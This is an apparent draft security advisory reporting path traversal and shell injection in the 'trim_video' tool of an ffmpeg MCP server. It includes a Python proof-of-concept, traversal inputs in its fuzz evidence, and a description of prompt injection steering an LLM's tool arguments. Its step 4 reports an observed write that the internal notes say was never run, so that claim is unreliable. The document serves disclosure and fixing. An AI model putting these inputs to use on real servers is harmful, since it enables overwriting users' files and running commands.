# Path traversal in `trim_video`: `inputPath` and `outputPath` are not confined, so trimmed output can be written or overwritten anywhere

**Repository:** `sworddut/mcp-ffmpeg-helper` · **Tool:** `trim_video` · **Tested commit:** `d68d010`
**Weakness:** CWE-22 Path Traversal

## Summary
`trim_video` runs ffmpeg to cut a time range from `inputPath` into `outputPath`. Neither path is checked against a base directory, and `../` sequences and absolute paths are accepted. The server creates the output's parent directories and passes `-y`, so an existing file at `outputPath` is overwritten without asking. A caller can read any media file the server user can read and write or overwrite media anywhere that user can write.

## Details
`src/tools/handlers.ts:80-97`:

```ts
case "trim_video": {
  const inputPath = validatePath(String(args?.inputPath), true);
  const outputPath = validatePath(String(args?.outputPath));
  const startTime = String(args?.startTime || "0");
  const duration = String(args?.duration || "");
  const endTime = String(args?.endTime || "");

  await ensureDirectoryExists(outputPath);

  let command = `-i "${inputPath}" -ss ${startTime}`;
  if (duration) {
    command += ` -t ${duration}`;
  } else if (endTime) {
    command += ` -to ${endTime}`;
  }
  command += ` -c copy "${outputPath}" -y`;
```

`validatePath` (`src/utils/file.ts:23-33`) checks only that the string is non-empty and, for the input, that it exists. `ensureDirectoryExists` (`src/utils/file.ts:8-18`) runs `mkdir(dirname(outputPath), { recursive: true })`. Nothing resolves the path or compares it with an allowed root.

A related, more serious problem sits in the same code path. `runFFmpegCommand` (`src/utils/ffmpeg.ts:33-40`) runs `ffmpeg ${command}` with `shell: true`. `startTime`, `duration` and `endTime` are inserted unquoted, so shell metacharacters in them, or a `"` or `$(...)` in `outputPath`, are interpreted by `/bin/sh` (CWE-78). Building an argument array and calling `spawn("ffmpeg", args)` without a shell fixes both problems.

## Steps to reproduce
1. Prerequisites: Node.js (README: v14+) and `ffmpeg` on `PATH`. Create a test video and a working directory for the server:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=2:size=64x64:rate=1 -pix_fmt yuv420p /tmp/tofu-in.mp4
   mkdir -p /tmp/tofu-work/a/b/c
   ```
2. Install and build as the README describes:
   ```bash
   git clone https://github.com/sworddut/mcp-ffmpeg-helper.git
   cd mcp-ffmpeg-helper && npm install && npm run build
   ```
   The server is `node build/index.js`. The script below starts it with `/tmp/tofu-work/a/b/c` as its working directory.
3. Call the tool:
   ```json
   {"inputPath": "/tmp/tofu-in.mp4", "outputPath": "../../../../../../../../tmp/tofu-poc/trim.mp4", "startTime": "0", "duration": "1"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/path/to/mcp-ffmpeg-helper/build/index.js"],
           cwd="/tmp/tofu-work/a/b/c",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("trim_video", {
                   "inputPath": "/tmp/tofu-in.mp4",
                   "outputPath": "../../../../../../../../tmp/tofu-poc/trim.mp4",
                   "startTime": "0",
                   "duration": "1",
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: `/tmp/tofu-poc/` is created and `/tmp/tofu-poc/trim.mp4` is written, outside the server's working directory. A second run overwrites it without a prompt.

## Expected behavior
Input and output paths are limited to a configured media or project directory. Paths that resolve outside it are rejected before any directory is created, and existing files are not overwritten unless the caller explicitly asks for it.

## Actual behavior
Any path is accepted. During fuzzing, traversal paths passed validation and stopped only because the sandbox had no matching input file:

```
{'inputPath': 'input.mp4', 'outputPath': '../../../../../tmp/evil.mp4', 'startTime': '0', 'duration': '9999999999', ...}
-> Error: Input file does not exist: input.mp4
{'inputPath': '..\\..\\..\\..\\windows\\win.ini', 'outputPath': 'C:\\output.mp4', ...}
-> Error: Input file does not exist: ..\\..\\..\\..\\windows\\win.ini
```

## Impact
The LLM chooses these arguments, and prompt injection in content it reads can steer them. An attacker can make the server create directories and write or overwrite media files anywhere the user can write. One example is replacing a video in the user's home directory with a one-second clip. Because `startTime`/`duration` are inserted unquoted, extra ffmpeg options such as `-f` can be smuggled in, which also allows overwriting files without a media extension. The shell problem above is more severe and should be treated as a separate finding.

## Suggested fix
- Add an allowed root, for example a CLI argument or env var that defaults to the working directory. Resolve both paths and reject either one unless it is inside the root.
- Replace the unconditional `-y` with `-n`, or add an explicit `overwrite` argument.
- Validate `startTime`, `duration` and `endTime` against a time format (`^\d+(\.\d+)?$` or `HH:MM:SS(.mmm)`), and call `spawn("ffmpeg", argv)` with an argument array and no shell.

## Status on the default branch
Still present at `d68d010` (2026-01-04). The tested commit is the current default branch head.

## Prior reports
- #6 "Security: OS command injection via unsanitized tool arguments in runFFmpegCommand (shell:true)" (issue, open 2026-07-11): reports the `shell: true` command injection that this draft mentions under Details (it names `trim_video` `startTime`, `duration` and `endTime`). It notes that `validatePath()` only checks existence but does not report path traversal or missing confinement. No fix: the default branch head `d68d010` (2026-01-04) predates it.
- Documentation: README.md: "C:/Users/username/videos/long_video.mp4" (the usage examples pass absolute paths under the user's home, and troubleshooting says only to make sure the app has permission for the given files and directories; there is no security section and no allowed-directory setting, so unconfined paths look like the intended contract)

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: CWE-22 not reported anywhere; the CWE-78 shell problem mentioned in Details is already reported as #6 (open, unfixed), so do not file it again as a new issue.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` (evidence), `check_reflected_output` also fired on this tool.
- Campaigns and executions: corpus-sbx 2048 exec / 2048 ok; e2-0922 1 exec / 1 ok (60 s budgets).
- Evidence (verbatim, trimmed):
  - `{'inputPath': '..\\..\\..\\..\\windows\\win.ini', 'outputPath': 'C:\\output.mp4', 'startTime': '-1', 'duration': '-10', 'endTime': '-5'}` -> `Error: Input file does not exist: ..\\..\\..\\..\\windows\\win.ini`
  - `{'inputPath': 'input.mp4', 'outputPath': '../../../../../tmp/evil.mp4', 'startTime': '0', 'duration': '9999999999', 'endTime': '9999999999'}` -> `Error: Input file does not exist: input.mp4`
  - `{'inputPath': '/etc/passwd\x00', 'outputPath': 'output.mp4', 'startTime': 'not_a_time', ...}` -> `Error: Input file does not exist: /etc/passwd\x00`
- Hand-check hints: weak as CWE-22. There is no containment (confirmed in source), but the server defines no intended directory, and the README shows absolute paths. Every evidence call stopped at the input existence check, so no traversal write was observed. The real issue is CWE-78 via the unquoted time fields and `shell: true` (`src/utils/ffmpeg.ts:36-40`, `handlers.ts:89-95`). Same root cause as the other 7 drafts for this repo; consider one consolidated path issue plus one CWE-78 issue. The reproduction above was derived from the code and has not been run.
</details>
